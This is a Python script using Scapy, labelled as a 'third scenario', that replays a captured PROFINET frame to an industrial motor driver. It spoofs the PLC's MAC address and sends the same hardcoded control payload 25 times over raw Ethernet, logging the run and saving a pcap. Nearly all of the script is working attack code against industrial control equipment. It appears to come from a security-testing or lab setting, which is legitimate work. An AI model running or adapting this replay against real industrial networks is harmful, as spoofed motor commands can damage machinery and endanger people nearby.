# Third Scenario: Replay of captured PLC–motor-driver packet

import os
import sys
import time
import logging
from scapy.all import Ether, sendp, conf, wrpcap, Raw

# ----- CONFIG -----
IFACE = "eth0"

SRC_MAC = "30:b8:51:03:21:a2"     # MAC Address PLC
DST_MAC = "00:0d:1e:1c:64:32"     # MAC Address Motor Deiver
PACKETS = 25
INTERVAL = 0
LOG_FILE = "/tmp/layer2_sender.log"
PCAP_SAVE = "/tmp/layer2_sent.pcap"
VERBOSE_PROGRESS = True
# -------------------

# Setup logger
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[
        logging.FileHandler(LOG_FILE),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger("layer2_sender")

# This is the PROFINET payload
PROFINET_PAYLOAD_HEX = """
80 00
80 80 80 80 1f 40 80 80 80 80 80 80 80 80 80 80
80 80 80 80 03 80 03 80 00 00 00 00 80 00 00 00
00 80 00 00 4e 20 80 00 00 80 00 00 80 00 00 80
00 80 00 00 80 00 00 80 00 80 80 80 80 80 80 80
80 80 80 80 80 80 80 80 03 e8 80 03 e8 80 03 e8
80 00 00 00 00 00 80 00 80 80 80 80 80 80 80 80
80 80 80 80 00 80 00 80 00 80 00 80 01 81 80 01
80 75 80 35 00
""".strip()

# turn the hex text into real bytes once
PROFINET_PAYLOAD = bytes.fromhex(" ".join(PROFINET_PAYLOAD_HEX.split()))

def make_profinet_frame(dst_mac, src_mac):
    """
    Build ONE frame that matches the screenshot:
    Ether(dst, src, type=0x8892) / Raw(load=PROFINET_PAYLOAD)
    """
    return Ether(dst=dst_mac, src=src_mac, type=0x8892) / Raw(load=PROFINET_PAYLOAD)

def main():
    if os.geteuid() != 0:
        logger.error("This script must be run as root (sudo). Exiting.")
        sys.exit(1)

    logger.info(f"Interface: {IFACE}")
    logger.info(f"Destination MAC: {DST_MAC}")
    logger.info(f"Packets to send: {PACKETS}, interval: {INTERVAL}s")
    conf.iface = IFACE

    # build the exact frame once, then send the same bytes many times
    frame = make_profinet_frame(DST_MAC, SRC_MAC)
    frames_to_save = []
    sent = 0

    try:
        for i in range(PACKETS):
            sendp(frame, iface=IFACE, verbose=False)
            frames_to_save.append(frame)
            sent += 1
            if VERBOSE_PROGRESS and (i % 10 == 0):
                logger.info(f"Sent {i+1}/{PACKETS} frames")
            if INTERVAL:
                time.sleep(INTERVAL)
    except KeyboardInterrupt:
        logger.warning("User interrupted sending.")
    except Exception as e:
        logger.exception("Exception during send: %s", e)

    logger.info(f"Finished. Sent {sent} frames.")

    # save pcap
    try:
        if frames_to_save:
            wrpcap(PCAP_SAVE, frames_to_save)
            logger.info(f"Saved sent frames to {PCAP_SAVE}")
    except Exception:
        logger.exception("Failed to write pcap")

if __name__ == "__main__":
    main()